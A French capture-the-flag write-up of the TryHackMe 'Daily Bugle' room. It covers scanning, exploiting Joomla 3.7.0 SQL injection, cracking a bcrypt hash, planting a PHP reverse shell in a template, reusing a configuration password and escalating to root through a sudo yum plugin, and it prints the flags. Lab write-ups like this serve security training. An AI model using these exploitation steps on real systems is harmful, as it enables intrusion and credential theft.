IP_VPN] : 10.18.94.166
[IP_MACHINE] : 10.10.204.52


# Task 1 Deploy

## Access the web server, who robbed the bank?

Quand on arrive sur la page principale, il y a écris en gros que spider-man vole la banque

Réponse 1 : **spider-man**

# Task 2 Obtain user and root

## What is the Joomla version?
On commmence par un nmap :

``` 
nmap -sS -sV -o nmap.txt 10.10.204.52

Nmap scan report for 10.10.204.52
Host is up (0.041s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
```
On remarque qu'il y a une Base de données MariaDB

Pour connaitre les autres pages, on va utiliser GoBuster :

```gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.204.52 -o gobuster.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.204.52
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
========================================================
2023/08/25 09:18:22 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 235] [--> http://10.10.204.52/images/]
/media                (Status: 301) [Size: 234] [--> http://10.10.204.52/media/]
/templates            (Status: 301) [Size: 238] [--> http://10.10.204.52/templates/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.204.52/modules/]
/bin                  (Status: 301) [Size: 232] [--> http://10.10.204.52/bin/]
/plugins              (Status: 301) [Size: 236] [--> http://10.10.204.52/plugins/]
/includes             (Status: 301) [Size: 237] [--> http://10.10.204.52/includes/]
/language             (Status: 301) [Size: 237] [--> http://10.10.204.52/language/]
/components           (Status: 301) [Size: 239] [--> http://10.10.204.52/components/]
/cache                (Status: 301) [Size: 234] [--> http://10.10.204.52/cache/]
/libraries            (Status: 301) [Size: 238] [--> http://10.10.204.52/libraries/]
/README.txt           (Status: 301) [Size: 238] [--> http://10.10.204.52/README.txt/]
/tmp                  (Status: 301) [Size: 232] [--> http://10.10.204.52/tmp/]
/layouts              (Status: 301) [Size: 236] [--> http://10.10.204.52/layouts/]
/administrator        (Status: 301) [Size: 242] [--> http://10.10.204.52/administrator/]
/cli                  (Status: 301) [Size: 232] [--> http://10.10.204.52/cli/]
```
On peut voir 2 résultats qui attirent l'oeil : **/README.txt** et **/Administrator**

Quand on ouvre le fichier "README.txt" on tombe la dessus :

```  Joomla! 3.7 version history - https://docs.joomla.org/Joomla_3.7_version_history ```

On peut donc en déduire que la version est 3.7.0

Réponse 2 : **3.7.0**

On peut aussi passer par un outil, "joomscan"

```sudo apt install joomscan```
```
joomscan -u [IP_MACHINE]

[+] Detecting Joomla Version
[++] Joomla 3.7.0
```
Réponse 2 : ** 3.7.0**

*Instead of using SQLMap, why not use a python script!*

## What is Jonah's cracked password?

Comme indiqué ci dessus, sans passer par sqlmap, on va chercher d'autres exploits :

En cherchant un peu, on trouve ce script python :

[GitHub] https://github.com/XiphosResearch/exploits/tree/master/Joomblah

On le télécharge et on l'éxécute :

``` python joomblah.py http://10.10.204.52
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```
Le script retrouve un super-user **jonah** et le **hash** de son mot de passe.

**[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']**

on va s'aider de hashid pour trouver de quel type de hash il s'agit :

```
hashid -j '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' 

[+] Blowfish(OpenBSD) [JtR Format: bcrypt]
```
```
hashid -m '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'

[+] Blowfish(OpenBSD) [Hashcat Mode: 3200] 
```
Pour garder une trace, j'enregistre le mot de passe dans un fichier, ici, ce sera jonah_hash.txt

On va maintenant crack le mot de passe avec JTR avec le format bcrypt

```
hashcat -m 3200 jonah_hash.txt /usr/share/wordlists/rockyou.txt

$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123
```
Réponse 3 : **spiderman123**

## What is the user flag?

Se connecter à l'interface Joomla avec les creds obtenus

Créer un revershell en php avec :
1.  Metasploit : use multi/handler set payload php/meterpreter/reverse_tcp
2.  php-reverse-shell.php : Déjà présent sur kali ou téléchargeable via [github]https://github.com/pentestmonkey/php-reverse-shell --> Modifier les lignes du host et du port  

Méthode 2 :

Copier le contenu du fichier php-reverse-shell.php
Sur Joomla, aller dans Extension > Templates > Templates > Beez3 Details and Files > index.php > Coller le contenu du fichier ici

Lancer un listener sur le port associé
``` nc -lvnp 4444```

Lancer la prévisualisation du template et hop, un shell apparait :)
On va stabiliser le shell
```python -c 'import pty;pty.spawn("/bin/bash")'```

Bon, on a pas de privilèges donc on va faire un peu de reconnaissance
```cd /var/www/html 
```

Un fichier configuration.php est intrigant.

2 lignes sont intéréssantes :

``` 
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
```
Regarder les utilisateurs dans le fichier /home
```
cd /home

ls

jjameson
```

Essayons de se connecter avec l'utilsiateur **jameson** et le mot de passe **nv5uz9r3ZEDzVjNu**
Holé ! ca a fonctionné !

On va allors aller dans le fichier de l'utilisateur jjameson
```
cd /home/jjameson/

ls 

user.txt 

cat user.txt 

27a260fe3cba712cfdedb1c86d80442e
```
Et voila, le flag de l'user

Réponse 4 : **27a260fe3cba712cfdedb1c86d80442e**

## What is the root flag?

En tapant la commande sudo -l on s'apperçoit que l'utilisateur à les permissions suivantes
```
sudo -l

(ALL) NOPASSWD: /usr/bin/yum
```
*HINT* S'aider de GTOBins --> Go

On va sur GTFOBins et on rehcerche yum

On suit les instruction pour sudo :

```
Générez un shell root interactif en chargeant un plugin personnalisé.

TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
BOOM ! We are ROOT !

On stabilise le shell
``` python -c 'import pty;pty.spawn("/bin/bash")'```

On a plus qu'à afficher le flag root.txt qui se trouve dans le chemin root/root.txt
```
cat root/root.txt 

eec3d53292b1821868266858d7fa6f79```

Réponse 5 : **eec3d53292b1821868266858d7fa6f79**

# Task 3 Credits 

Pas besoin de réponse


[P0WN3D]
